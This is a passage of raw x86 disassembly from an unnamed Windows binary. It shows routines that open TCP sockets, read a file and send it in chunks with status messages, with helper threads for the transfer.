131416e3:	50                   	push   %eax
131416e4:	ff 75 08             	pushl  0x8(%ebp)
131416e7:	ff 15 4c 37 15 13    	call   *0x1315374c
131416ed:	3b c6                	cmp    %esi,%eax
131416ef:	74 22                	je     0x13141713
131416f1:	83 f8 ff             	cmp    $0xffffffff,%eax
131416f4:	74 1d                	je     0x13141713
131416f6:	8d 4d d8             	lea    -0x28(%ebp),%ecx
131416f9:	56                   	push   %esi
131416fa:	51                   	push   %ecx
131416fb:	50                   	push   %eax
131416fc:	8d 85 94 fe ff ff    	lea    -0x16c(%ebp),%eax
13141702:	50                   	push   %eax
13141703:	ff 35 38 22 15 13    	pushl  0x13152238
13141709:	ff 15 b4 33 15 13    	call   *0x131533b4
1314170f:	85 c0                	test   %eax,%eax
13141711:	75 bc                	jne    0x131416cf
13141713:	68 f4 01 00 00       	push   $0x1f4
13141718:	ff 15 fc 36 15 13    	call   *0x131536fc
1314171e:	56                   	push   %esi
1314171f:	ff 75 f8             	pushl  -0x8(%ebp)
13141722:	ff 15 d8 36 15 13    	call   *0x131536d8
13141728:	56                   	push   %esi
13141729:	ff 75 fc             	pushl  -0x4(%ebp)
1314172c:	ff 15 d8 36 15 13    	call   *0x131536d8
13141732:	ff 75 f8             	pushl  -0x8(%ebp)
13141735:	ff 15 80 33 15 13    	call   *0x13153380
1314173b:	ff 75 fc             	pushl  -0x4(%ebp)
1314173e:	ff 15 80 33 15 13    	call   *0x13153380
13141744:	56                   	push   %esi
13141745:	ff 75 e8             	pushl  -0x18(%ebp)
13141748:	ff 15 f8 33 15 13    	call   *0x131533f8
1314174e:	56                   	push   %esi
1314174f:	ff 75 ec             	pushl  -0x14(%ebp)
13141752:	ff 15 d8 36 15 13    	call   *0x131536d8
13141758:	ff 75 e8             	pushl  -0x18(%ebp)
1314175b:	ff 15 80 33 15 13    	call   *0x13153380
13141761:	ff 75 ec             	pushl  -0x14(%ebp)
13141764:	ff 15 80 33 15 13    	call   *0x13153380
1314176a:	ff 75 08             	pushl  0x8(%ebp)
1314176d:	ff 15 e4 36 15 13    	call   *0x131536e4
13141773:	56                   	push   %esi
13141774:	ff 15 ec 36 15 13    	call   *0x131536ec
1314177a:	33 c0                	xor    %eax,%eax
1314177c:	5f                   	pop    %edi
1314177d:	5e                   	pop    %esi
1314177e:	c9                   	leave  
1314177f:	c2 04 00             	ret    $0x4
13141782:	55                   	push   %ebp
13141783:	8b ec                	mov    %esp,%ebp
13141785:	81 ec 18 06 00 00    	sub    $0x618,%esp
1314178b:	56                   	push   %esi
1314178c:	57                   	push   %edi
1314178d:	68 54 22 15 13       	push   $0x13152254
13141792:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
13141798:	68 00 d1 14 13       	push   $0x1314d100
1314179d:	50                   	push   %eax
1314179e:	ff 15 98 39 15 13    	call   *0x13153998
131417a4:	83 c4 0c             	add    $0xc,%esp
131417a7:	6a 06                	push   $0x6
131417a9:	6a 01                	push   $0x1
131417ab:	6a 02                	push   $0x2
131417ad:	ff 15 64 35 15 13    	call   *0x13153564
131417b3:	83 f8 ff             	cmp    $0xffffffff,%eax
131417b6:	a3 2c 22 15 13       	mov    %eax,0x1315222c
131417bb:	75 53                	jne    0x13141810
131417bd:	33 f6                	xor    %esi,%esi
131417bf:	68 d8 d0 14 13       	push   $0x1314d0d8
131417c4:	89 35 4c 22 15 13    	mov    %esi,0x1315224c
131417ca:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
131417d0:	50                   	push   %eax
131417d1:	ff 15 98 39 15 13    	call   *0x13153998
131417d7:	39 35 54 23 15 13    	cmp    %esi,0x13152354
131417dd:	59                   	pop    %ecx
131417de:	59                   	pop    %ecx
131417df:	0f 85 ec 00 00 00    	jne    0x131418d1
131417e5:	ff 35 58 23 15 13    	pushl  0x13152358
131417eb:	b9 81 01 00 00       	mov    $0x181,%ecx
131417f0:	8d b5 e8 f9 ff ff    	lea    -0x618(%ebp),%esi
131417f6:	81 ec 04 06 00 00    	sub    $0x604,%esp
131417fc:	8b fc                	mov    %esp,%edi
131417fe:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13141800:	e8 e7 72 00 00       	call   0x13148aec
13141805:	81 c4 08 06 00 00    	add    $0x608,%esp
1314180b:	e9 c1 00 00 00       	jmp    0x131418d1
13141810:	66 a1 28 22 15 13    	mov    0x13152228,%ax
13141816:	66 c7 45 ec 02 00    	movw   $0x2,-0x14(%ebp)
1314181c:	50                   	push   %eax
1314181d:	ff 15 8c 37 15 13    	call   *0x1315378c
13141823:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
13141827:	8d 45 ec             	lea    -0x14(%ebp),%eax
1314182a:	6a 10                	push   $0x10
1314182c:	50                   	push   %eax
1314182d:	ff 35 2c 22 15 13    	pushl  0x1315222c
13141833:	33 f6                	xor    %esi,%esi
13141835:	89 75 f0             	mov    %esi,-0x10(%ebp)
13141838:	ff 15 5c 37 15 13    	call   *0x1315375c
1314183e:	83 f8 ff             	cmp    $0xffffffff,%eax
13141841:	75 10                	jne    0x13141853
13141843:	89 35 4c 22 15 13    	mov    %esi,0x1315224c
13141849:	68 b4 d0 14 13       	push   $0x1314d0b4
1314184e:	e9 77 ff ff ff       	jmp    0x131417ca
13141853:	ff 35 28 22 15 13    	pushl  0x13152228
13141859:	6a 01                	push   $0x1
1314185b:	e8 40 01 00 00       	call   0x131419a0
13141860:	59                   	pop    %ecx
13141861:	59                   	pop    %ecx
13141862:	68 ff 00 00 00       	push   $0xff
13141867:	ff 35 2c 22 15 13    	pushl  0x1315222c
1314186d:	ff 15 00 34 15 13    	call   *0x13153400
13141873:	39 35 4c 22 15 13    	cmp    %esi,0x1315224c
13141879:	74 40                	je     0x131418bb
1314187b:	56                   	push   %esi
1314187c:	56                   	push   %esi
1314187d:	ff 35 2c 22 15 13    	pushl  0x1315222c
13141883:	ff 15 3c 37 15 13    	call   *0x1315373c
13141889:	8b f8                	mov    %eax,%edi
1314188b:	33 c0                	xor    %eax,%eax
1314188d:	83 ff ff             	cmp    $0xffffffff,%edi
13141890:	0f 94 c0             	sete   %al
13141893:	33 c9                	xor    %ecx,%ecx
13141895:	3b fe                	cmp    %esi,%edi
13141897:	0f 94 c1             	sete   %cl
1314189a:	0b c1                	or     %ecx,%eax
1314189c:	75 20                	jne    0x131418be
1314189e:	8d 45 fc             	lea    -0x4(%ebp),%eax
131418a1:	50                   	push   %eax
131418a2:	56                   	push   %esi
131418a3:	57                   	push   %edi
131418a4:	68 dc 15 14 13       	push   $0x131415dc
131418a9:	56                   	push   %esi
131418aa:	56                   	push   %esi
131418ab:	ff 15 30 37 15 13    	call   *0x13153730
131418b1:	39 35 4c 22 15 13    	cmp    %esi,0x1315224c
131418b7:	75 c2                	jne    0x1314187b
131418b9:	eb 03                	jmp    0x131418be
131418bb:	8b 7d fc             	mov    -0x4(%ebp),%edi
131418be:	ff 35 2c 22 15 13    	pushl  0x1315222c
131418c4:	ff 15 e4 36 15 13    	call   *0x131536e4
131418ca:	57                   	push   %edi
131418cb:	ff 15 e4 36 15 13    	call   *0x131536e4
131418d1:	5f                   	pop    %edi
131418d2:	33 c0                	xor    %eax,%eax
131418d4:	5e                   	pop    %esi
131418d5:	c9                   	leave  
131418d6:	c2 04 00             	ret    $0x4
131418d9:	55                   	push   %ebp
131418da:	8b ec                	mov    %esp,%ebp
131418dc:	ff 75 0c             	pushl  0xc(%ebp)
131418df:	68 00 d1 14 13       	push   $0x1314d100
131418e4:	68 54 22 15 13       	push   $0x13152254
131418e9:	ff 15 98 39 15 13    	call   *0x13153998
131418ef:	33 c0                	xor    %eax,%eax
131418f1:	83 c4 0c             	add    $0xc,%esp
131418f4:	39 05 4c 22 15 13    	cmp    %eax,0x1315224c
131418fa:	74 04                	je     0x13141900
131418fc:	6a 02                	push   $0x2
131418fe:	eb 42                	jmp    0x13141942
13141900:	8b 0d 44 45 17 13    	mov    0x13174544,%ecx
13141906:	c7 05 4c 22 15 13 01 	movl   $0x1,0x1315224c
1314190d:	00 00 00 
13141910:	89 0d 54 23 15 13    	mov    %ecx,0x13152354
13141916:	8b 4d 08             	mov    0x8(%ebp),%ecx
13141919:	89 0d 28 22 15 13    	mov    %ecx,0x13152228
1314191f:	8b 4d 10             	mov    0x10(%ebp),%ecx
13141922:	89 0d 58 23 15 13    	mov    %ecx,0x13152358
13141928:	8d 4d 0c             	lea    0xc(%ebp),%ecx
1314192b:	51                   	push   %ecx
1314192c:	50                   	push   %eax
1314192d:	50                   	push   %eax
1314192e:	68 82 17 14 13       	push   $0x13141782
13141933:	50                   	push   %eax
13141934:	50                   	push   %eax
13141935:	ff 15 30 37 15 13    	call   *0x13153730
1314193b:	a3 50 22 15 13       	mov    %eax,0x13152250
13141940:	6a 01                	push   $0x1
13141942:	58                   	pop    %eax
13141943:	5d                   	pop    %ebp
13141944:	c3                   	ret    
13141945:	56                   	push   %esi
13141946:	33 f6                	xor    %esi,%esi
13141948:	39 35 4c 22 15 13    	cmp    %esi,0x1315224c
1314194e:	75 04                	jne    0x13141954
13141950:	33 c0                	xor    %eax,%eax
13141952:	5e                   	pop    %esi
13141953:	c3                   	ret    
13141954:	ff 35 2c 22 15 13    	pushl  0x1315222c
1314195a:	89 35 4c 22 15 13    	mov    %esi,0x1315224c
13141960:	ff 15 e4 36 15 13    	call   *0x131536e4
13141966:	56                   	push   %esi
13141967:	ff 35 50 22 15 13    	pushl  0x13152250
1314196d:	ff 15 d8 36 15 13    	call   *0x131536d8
13141973:	56                   	push   %esi
13141974:	ff 35 44 22 15 13    	pushl  0x13152244
1314197a:	ff 15 f8 33 15 13    	call   *0x131533f8
13141980:	39 74 24 08          	cmp    %esi,0x8(%esp)
13141984:	74 09                	je     0x1314198f
13141986:	56                   	push   %esi
13141987:	56                   	push   %esi
13141988:	e8 13 00 00 00       	call   0x131419a0
1314198d:	59                   	pop    %ecx
1314198e:	59                   	pop    %ecx
1314198f:	6a 01                	push   $0x1
13141991:	58                   	pop    %eax
13141992:	5e                   	pop    %esi
13141993:	c3                   	ret    
13141994:	a1 4c 22 15 13       	mov    0x1315224c,%eax
13141999:	c3                   	ret    
1314199a:	a1 28 22 15 13       	mov    0x13152228,%eax
1314199f:	c3                   	ret    
131419a0:	8d 44 24 04          	lea    0x4(%esp),%eax
131419a4:	6a 04                	push   $0x4
131419a6:	50                   	push   %eax
131419a7:	68 14 d1 14 13       	push   $0x1314d114
131419ac:	e8 5a 55 00 00       	call   0x13146f0b
131419b1:	83 c4 0c             	add    $0xc,%esp
131419b4:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
131419b9:	74 14                	je     0x131419cf
131419bb:	8d 44 24 08          	lea    0x8(%esp),%eax
131419bf:	6a 04                	push   $0x4
131419c1:	50                   	push   %eax
131419c2:	68 04 d1 14 13       	push   $0x1314d104
131419c7:	e8 3f 55 00 00       	call   0x13146f0b
131419cc:	83 c4 0c             	add    $0xc,%esp
131419cf:	6a 01                	push   $0x1
131419d1:	58                   	pop    %eax
131419d2:	c3                   	ret    
131419d3:	55                   	push   %ebp
131419d4:	8b ec                	mov    %esp,%ebp
131419d6:	81 ec 2c 0a 00 00    	sub    $0xa2c,%esp
131419dc:	53                   	push   %ebx
131419dd:	56                   	push   %esi
131419de:	57                   	push   %edi
131419df:	68 f8 27 15 13       	push   $0x131527f8
131419e4:	8d 85 d4 fa ff ff    	lea    -0x52c(%ebp),%eax
131419ea:	68 00 d1 14 13       	push   $0x1314d100
131419ef:	50                   	push   %eax
131419f0:	ff 15 98 39 15 13    	call   *0x13153998
131419f6:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
131419fc:	68 80 d7 14 13       	push   $0x1314d780
13141a01:	50                   	push   %eax
13141a02:	ff 15 98 39 15 13    	call   *0x13153998
13141a08:	33 db                	xor    %ebx,%ebx
13141a0a:	83 c4 14             	add    $0x14,%esp
13141a0d:	39 1d f8 28 15 13    	cmp    %ebx,0x131528f8
13141a13:	75 26                	jne    0x13141a3b
13141a15:	ff 35 fc 28 15 13    	pushl  0x131528fc
13141a1b:	b9 81 01 00 00       	mov    $0x181,%ecx
13141a20:	8d b5 d4 f9 ff ff    	lea    -0x62c(%ebp),%esi
13141a26:	81 ec 04 06 00 00    	sub    $0x604,%esp
13141a2c:	8b fc                	mov    %esp,%edi
13141a2e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13141a30:	e8 b7 70 00 00       	call   0x13148aec
13141a35:	81 c4 08 06 00 00    	add    $0x608,%esp
13141a3b:	6a 06                	push   $0x6
13141a3d:	6a 01                	push   $0x1
13141a3f:	6a 02                	push   $0x2
13141a41:	ff 15 64 35 15 13    	call   *0x13153564
13141a47:	83 cf ff             	or     $0xffffffff,%edi
13141a4a:	89 45 fc             	mov    %eax,-0x4(%ebp)
13141a4d:	3b c7                	cmp    %edi,%eax
13141a4f:	75 10                	jne    0x13141a61
13141a51:	89 1d f0 27 15 13    	mov    %ebx,0x131527f0
13141a57:	68 58 d7 14 13       	push   $0x1314d758
13141a5c:	e9 15 01 00 00       	jmp    0x13141b76
13141a61:	66 a1 a8 27 15 13    	mov    0x131527a8,%ax
13141a67:	66 c7 45 dc 02 00    	movw   $0x2,-0x24(%ebp)
13141a6d:	50                   	push   %eax
13141a6e:	ff 15 8c 37 15 13    	call   *0x1315378c
13141a74:	be 28 26 15 13       	mov    $0x13152628,%esi
13141a79:	66 89 45 de          	mov    %ax,-0x22(%ebp)
13141a7d:	56                   	push   %esi
13141a7e:	ff 15 ac 39 15 13    	call   *0x131539ac
13141a84:	3b c7                	cmp    %edi,%eax
13141a86:	56                   	push   %esi
13141a87:	75 07                	jne    0x13141a90
13141a89:	e8 98 39 00 00       	call   0x13145426
13141a8e:	59                   	pop    %ecx
13141a8f:	50                   	push   %eax
13141a90:	ff 15 ac 39 15 13    	call   *0x131539ac
13141a96:	89 45 e0             	mov    %eax,-0x20(%ebp)
13141a99:	8d 45 dc             	lea    -0x24(%ebp),%eax
13141a9c:	6a 10                	push   $0x10
13141a9e:	50                   	push   %eax
13141a9f:	ff 75 fc             	pushl  -0x4(%ebp)
13141aa2:	ff 15 34 37 15 13    	call   *0x13153734
13141aa8:	3b c7                	cmp    %edi,%eax
13141aaa:	75 24                	jne    0x13141ad0
13141aac:	ff 35 a8 27 15 13    	pushl  0x131527a8
13141ab2:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
13141ab8:	89 1d f0 27 15 13    	mov    %ebx,0x131527f0
13141abe:	56                   	push   %esi
13141abf:	68 2c d7 14 13       	push   $0x1314d72c
13141ac4:	50                   	push   %eax
13141ac5:	ff 15 98 39 15 13    	call   *0x13153998
13141acb:	83 c4 10             	add    $0x10,%esp
13141ace:	eb 3b                	jmp    0x13141b0b
13141ad0:	53                   	push   %ebx
13141ad1:	53                   	push   %ebx
13141ad2:	6a 03                	push   $0x3
13141ad4:	53                   	push   %ebx
13141ad5:	6a 01                	push   $0x1
13141ad7:	be a8 26 15 13       	mov    $0x131526a8,%esi
13141adc:	68 00 00 00 80       	push   $0x80000000
13141ae1:	56                   	push   %esi
13141ae2:	ff 15 e0 33 15 13    	call   *0x131533e0
13141ae8:	3b c7                	cmp    %edi,%eax
13141aea:	89 45 f8             	mov    %eax,-0x8(%ebp)
13141aed:	75 58                	jne    0x13141b47
13141aef:	56                   	push   %esi
13141af0:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
13141af6:	68 08 d7 14 13       	push   $0x1314d708
13141afb:	50                   	push   %eax
13141afc:	89 1d f0 27 15 13    	mov    %ebx,0x131527f0
13141b02:	ff 15 98 39 15 13    	call   *0x13153998
13141b08:	83 c4 0c             	add    $0xc,%esp
13141b0b:	39 1d f8 28 15 13    	cmp    %ebx,0x131528f8
13141b11:	75 26                	jne    0x13141b39
13141b13:	ff 35 fc 28 15 13    	pushl  0x131528fc
13141b19:	b9 81 01 00 00       	mov    $0x181,%ecx
13141b1e:	8d b5 d4 f9 ff ff    	lea    -0x62c(%ebp),%esi
13141b24:	81 ec 04 06 00 00    	sub    $0x604,%esp
13141b2a:	8b fc                	mov    %esp,%edi
13141b2c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13141b2e:	e8 b9 6f 00 00       	call   0x13148aec
13141b33:	81 c4 08 06 00 00    	add    $0x608,%esp
13141b39:	ff 75 fc             	pushl  -0x4(%ebp)
13141b3c:	ff 15 e4 36 15 13    	call   *0x131536e4
13141b42:	e9 ab 02 00 00       	jmp    0x13141df2
13141b47:	8d 4d d8             	lea    -0x28(%ebp),%ecx
13141b4a:	51                   	push   %ecx
13141b4b:	50                   	push   %eax
13141b4c:	ff 15 a8 39 15 13    	call   *0x131539a8
13141b52:	3b c3                	cmp    %ebx,%eax
13141b54:	89 45 f4             	mov    %eax,-0xc(%ebp)
13141b57:	75 28                	jne    0x13141b81
13141b59:	ff 75 fc             	pushl  -0x4(%ebp)
13141b5c:	89 1d f0 27 15 13    	mov    %ebx,0x131527f0
13141b62:	ff 15 e4 36 15 13    	call   *0x131536e4
13141b68:	ff 75 f8             	pushl  -0x8(%ebp)
13141b6b:	ff 15 80 33 15 13    	call   *0x13153380
13141b71:	68 e4 d6 14 13       	push   $0x1314d6e4
13141b76:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
13141b7c:	e9 3a 02 00 00       	jmp    0x13141dbb
13141b81:	56                   	push   %esi
13141b82:	50                   	push   %eax
13141b83:	68 ad 27 15 13       	push   $0x131527ad
13141b88:	8d 85 d4 f5 ff ff    	lea    -0xa2c(%ebp),%eax
13141b8e:	68 d4 d6 14 13       	push   $0x1314d6d4
13141b93:	50                   	push   %eax
13141b94:	ff 15 98 39 15 13    	call   *0x13153998
13141b9a:	83 c4 14             	add    $0x14,%esp
13141b9d:	8d 85 d4 f5 ff ff    	lea    -0xa2c(%ebp),%eax
13141ba3:	53                   	push   %ebx
13141ba4:	50                   	push   %eax
13141ba5:	e8 53 0b 00 00       	call   0x131426fd
13141baa:	59                   	pop    %ecx
13141bab:	50                   	push   %eax
13141bac:	8d 85 d4 f5 ff ff    	lea    -0xa2c(%ebp),%eax
13141bb2:	50                   	push   %eax
13141bb3:	ff 75 fc             	pushl  -0x4(%ebp)
13141bb6:	ff 15 68 37 15 13    	call   *0x13153768
13141bbc:	68 00 04 00 00       	push   $0x400
13141bc1:	8d 85 d4 f5 ff ff    	lea    -0xa2c(%ebp),%eax
13141bc7:	53                   	push   %ebx
13141bc8:	50                   	push   %eax
13141bc9:	e8 54 0a 00 00       	call   0x13142622
13141bce:	83 c4 0c             	add    $0xc,%esp
13141bd1:	89 5d f0             	mov    %ebx,-0x10(%ebp)
13141bd4:	8b 45 f0             	mov    -0x10(%ebp),%eax
13141bd7:	83 f8 40             	cmp    $0x40,%eax
13141bda:	74 1e                	je     0x13141bfa
13141bdc:	8d bc 05 d4 f5 ff ff 	lea    -0xa2c(%ebp,%eax,1),%edi
13141be3:	53                   	push   %ebx
13141be4:	6a 01                	push   $0x1
13141be6:	57                   	push   %edi
13141be7:	ff 75 fc             	pushl  -0x4(%ebp)
13141bea:	ff 15 4c 37 15 13    	call   *0x1315374c
13141bf0:	80 3f 0a             	cmpb   $0xa,(%edi)
13141bf3:	74 05                	je     0x13141bfa
13141bf5:	ff 45 f0             	incl   -0x10(%ebp)
13141bf8:	eb da                	jmp    0x13141bd4
13141bfa:	8d 85 d4 f5 ff ff    	lea    -0xa2c(%ebp),%eax
13141c00:	50                   	push   %eax
13141c01:	e8 53 38 00 00       	call   0x13145459
13141c06:	6a 03                	push   $0x3
13141c08:	8d 85 d4 f5 ff ff    	lea    -0xa2c(%ebp),%eax
13141c0e:	68 d0 d6 14 13       	push   $0x1314d6d0
13141c13:	50                   	push   %eax
13141c14:	e8 78 0a 00 00       	call   0x13142691
13141c19:	83 c4 10             	add    $0x10,%esp
13141c1c:	85 c0                	test   %eax,%eax
13141c1e:	0f 84 9b 00 00 00    	je     0x13141cbf
13141c24:	ff 75 fc             	pushl  -0x4(%ebp)
13141c27:	89 1d f0 27 15 13    	mov    %ebx,0x131527f0
13141c2d:	ff 15 e4 36 15 13    	call   *0x131536e4
13141c33:	ff 75 f8             	pushl  -0x8(%ebp)
13141c36:	ff 15 80 33 15 13    	call   *0x13153380
13141c3c:	8d 85 d4 f5 ff ff    	lea    -0xa2c(%ebp),%eax
13141c42:	50                   	push   %eax
13141c43:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
13141c49:	68 9c d6 14 13       	push   $0x1314d69c
13141c4e:	50                   	push   %eax
13141c4f:	ff 15 98 39 15 13    	call   *0x13153998
13141c55:	83 c4 0c             	add    $0xc,%esp
13141c58:	38 1d ac 27 15 13    	cmp    %bl,0x131527ac
13141c5e:	74 29                	je     0x13141c89
13141c60:	56                   	push   %esi
13141c61:	ff 15 c8 36 15 13    	call   *0x131536c8
13141c67:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
13141c6d:	68 90 d6 14 13       	push   $0x1314d690
13141c72:	50                   	push   %eax
13141c73:	e8 85 0a 00 00       	call   0x131426fd
13141c78:	59                   	pop    %ecx
13141c79:	8d 84 05 d4 fb ff ff 	lea    -0x42c(%ebp,%eax,1),%eax
13141c80:	50                   	push   %eax
13141c81:	ff 15 98 39 15 13    	call   *0x13153998
13141c87:	59                   	pop    %ecx
13141c88:	59                   	pop    %ecx
13141c89:	39 1d f8 28 15 13    	cmp    %ebx,0x131528f8
13141c8f:	75 26                	jne    0x13141cb7
13141c91:	ff 35 fc 28 15 13    	pushl  0x131528fc
13141c97:	b9 81 01 00 00       	mov    $0x181,%ecx
13141c9c:	8d b5 d4 f9 ff ff    	lea    -0x62c(%ebp),%esi
13141ca2:	81 ec 04 06 00 00    	sub    $0x604,%esp
13141ca8:	8b fc                	mov    %esp,%edi
13141caa:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13141cac:	e8 3b 6e 00 00       	call   0x13148aec
13141cb1:	81 c4 08 06 00 00    	add    $0x608,%esp
13141cb7:	6a 16                	push   $0x16
13141cb9:	58                   	pop    %eax
13141cba:	e9 35 01 00 00       	jmp    0x13141df4
13141cbf:	68 00 04 00 00       	push   $0x400
13141cc4:	8d 85 d4 f5 ff ff    	lea    -0xa2c(%ebp),%eax
13141cca:	53                   	push   %ebx
13141ccb:	50                   	push   %eax
13141ccc:	e8 51 09 00 00       	call   0x13142622
13141cd1:	83 c4 0c             	add    $0xc,%esp
13141cd4:	33 ff                	xor    %edi,%edi
13141cd6:	39 1d f0 27 15 13    	cmp    %ebx,0x131527f0
13141cdc:	74 43                	je     0x13141d21
13141cde:	8d 45 ec             	lea    -0x14(%ebp),%eax
13141ce1:	53                   	push   %ebx
13141ce2:	50                   	push   %eax
13141ce3:	8d 85 d4 f5 ff ff    	lea    -0xa2c(%ebp),%eax
13141ce9:	68 00 04 00 00       	push   $0x400
13141cee:	50                   	push   %eax
13141cef:	ff 75 f8             	pushl  -0x8(%ebp)
13141cf2:	ff 15 54 35 15 13    	call   *0x13153554
13141cf8:	85 c0                	test   %eax,%eax
13141cfa:	74 25                	je     0x13141d21
13141cfc:	53                   	push   %ebx
13141cfd:	8d 85 d4 f5 ff ff    	lea    -0xa2c(%ebp),%eax
13141d03:	ff 75 ec             	pushl  -0x14(%ebp)
13141d06:	50                   	push   %eax
13141d07:	ff 75 fc             	pushl  -0x4(%ebp)
13141d0a:	ff 15 68 37 15 13    	call   *0x13153768
13141d10:	3b c3                	cmp    %ebx,%eax
13141d12:	74 0d                	je     0x13141d21
13141d14:	83 f8 ff             	cmp    $0xffffffff,%eax
13141d17:	74 08                	je     0x13141d21
13141d19:	03 7d ec             	add    -0x14(%ebp),%edi
13141d1c:	3b 7d f4             	cmp    -0xc(%ebp),%edi
13141d1f:	72 b5                	jb     0x13141cd6
13141d21:	68 f4 01 00 00       	push   $0x1f4
13141d26:	ff 15 fc 36 15 13    	call   *0x131536fc
13141d2c:	ff 75 f8             	pushl  -0x8(%ebp)
13141d2f:	ff 15 80 33 15 13    	call   *0x13153380
13141d35:	ff 75 fc             	pushl  -0x4(%ebp)
13141d38:	ff 15 e4 36 15 13    	call   *0x131536e4
13141d3e:	3b 7d f4             	cmp    -0xc(%ebp),%edi
13141d41:	89 1d f0 27 15 13    	mov    %ebx,0x131527f0
13141d47:	73 31                	jae    0x13141d7a
13141d49:	ff 35 fc 28 15 13    	pushl  0x131528fc
13141d4f:	e8 aa 6e 00 00       	call   0x13148bfe
13141d54:	59                   	pop    %ecx
13141d55:	50                   	push   %eax
13141d56:	ff 75 f4             	pushl  -0xc(%ebp)
13141d59:	56                   	push   %esi
13141d5a:	6a 02                	push   $0x2
13141d5c:	e8 82 6e 00 00       	call   0x13148be3
13141d61:	59                   	pop    %ecx
13141d62:	50                   	push   %eax
13141d63:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
13141d69:	68 68 d6 14 13       	push   $0x1314d668
13141d6e:	50                   	push   %eax
13141d6f:	ff 15 98 39 15 13    	call   *0x13153998
13141d75:	83 c4 18             	add    $0x18,%esp
13141d78:	eb 19                	jmp    0x13141d93
13141d7a:	ff 75 f4             	pushl  -0xc(%ebp)
13141d7d:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
13141d83:	56                   	push   %esi
13141d84:	68 48 d6 14 13       	push   $0x1314d648
13141d89:	50                   	push   %eax
13141d8a:	ff 15 98 39 15 13    	call   *0x13153998
13141d90:	83 c4 10             	add    $0x10,%esp
13141d93:	38 1d ac 27 15 13    	cmp    %bl,0x131527ac
13141d99:	74 29                	je     0x13141dc4
13141d9b:	56                   	push   %esi
13141d9c:	ff 15 c8 36 15 13    	call   *0x131536c8
13141da2:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
13141da8:	68 90 d6 14 13       	push   $0x1314d690
13141dad:	50                   	push   %eax
13141dae:	e8 4a 09 00 00       	call   0x131426fd
13141db3:	59                   	pop    %ecx
13141db4:	8d 84 05 d4 fb ff ff 	lea    -0x42c(%ebp,%eax,1),%eax
13141dbb:	50                   	push   %eax
13141dbc:	ff 15 98 39 15 13    	call   *0x13153998
13141dc2:	59                   	pop    %ecx
13141dc3:	59                   	pop    %ecx
13141dc4:	39 1d f8 28 15 13    	cmp    %ebx,0x131528f8
13141dca:	75 26                	jne    0x13141df2
13141dcc:	ff 35 fc 28 15 13    	pushl  0x131528fc
13141dd2:	b9 81 01 00 00       	mov    $0x181,%ecx
13141dd7:	8d b5 d4 f9 ff ff    	lea    -0x62c(%ebp),%esi
13141ddd:	81 ec 04 06 00 00    	sub    $0x604,%esp
13141de3:	8b fc                	mov    %esp,%edi
13141de5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13141de7:	e8 00 6d 00 00       	call   0x13148aec
13141dec:	81 c4 08 06 00 00    	add    $0x608,%esp
13141df2:	33 c0                	xor    %eax,%eax
13141df4:	5f                   	pop    %edi
13141df5:	5e                   	pop    %esi
13141df6:	5b                   	pop    %ebx
13141df7:	c9                   	leave  
13141df8:	c2 04 00             	ret    $0x4
13141dfb:	55                   	push   %ebp
13141dfc:	8b ec                	mov    %esp,%ebp
13141dfe:	56                   	push   %esi
13141dff:	33 f6                	xor    %esi,%esi
13141e01:	39 35 f0 27 15 13    	cmp    %esi,0x131527f0
13141e07:	74 05                	je     0x13141e0e
13141e09:	6a 02                	push   $0x2
13141e0b:	58                   	pop    %eax
13141e0c:	eb 7f                	jmp    0x13141e8d
13141e0e:	a1 44 45 17 13       	mov    0x13174544,%eax
13141e13:	ff 75 08             	pushl  0x8(%ebp)
13141e16:	a3 f8 28 15 13       	mov    %eax,0x131528f8
13141e1b:	8b 45 20             	mov    0x20(%ebp),%eax
13141e1e:	68 a8 26 15 13       	push   $0x131526a8
13141e23:	a3 fc 28 15 13       	mov    %eax,0x131528fc
13141e28:	ff 15 98 39 15 13    	call   *0x13153998
13141e2e:	ff 75 0c             	pushl  0xc(%ebp)
13141e31:	68 28 26 15 13       	push   $0x13152628
13141e36:	ff 15 98 39 15 13    	call   *0x13153998
13141e3c:	ff 75 14             	pushl  0x14(%ebp)
13141e3f:	68 ad 27 15 13       	push   $0x131527ad
13141e44:	ff 15 98 39 15 13    	call   *0x13153998
13141e4a:	ff 75 1c             	pushl  0x1c(%ebp)
13141e4d:	68 f8 27 15 13       	push   $0x131527f8
13141e52:	ff 15 98 39 15 13    	call   *0x13153998
13141e58:	8b 45 10             	mov    0x10(%ebp),%eax
13141e5b:	83 c4 20             	add    $0x20,%esp
13141e5e:	a3 a8 27 15 13       	mov    %eax,0x131527a8
13141e63:	8a 45 18             	mov    0x18(%ebp),%al
13141e66:	a2 ac 27 15 13       	mov    %al,0x131527ac
13141e6b:	8d 45 20             	lea    0x20(%ebp),%eax
13141e6e:	50                   	push   %eax
13141e6f:	56                   	push   %esi
13141e70:	56                   	push   %esi
13141e71:	68 d3 19 14 13       	push   $0x131419d3
13141e76:	56                   	push   %esi
13141e77:	56                   	push   %esi
13141e78:	c7 05 f0 27 15 13 01 	movl   $0x1,0x131527f0
13141e7f:	00 00 00 
13141e82:	ff 15 30 37 15 13    	call   *0x13153730
13141e88:	a3 f4 27 15 13       	mov    %eax,0x131527f4
13141e8d:	5e                   	pop    %esi
13141e8e:	5d                   	pop    %ebp
13141e8f:	c3                   	ret    
13141e90:	33 c0                	xor    %eax,%eax
13141e92:	39 05 f0 27 15 13    	cmp    %eax,0x131527f0
13141e98:	75 04                	jne    0x13141e9e
13141e9a:	6a 02                	push   $0x2
13141e9c:	58                   	pop    %eax
13141e9d:	c3                   	ret    
13141e9e:	50                   	push   %eax
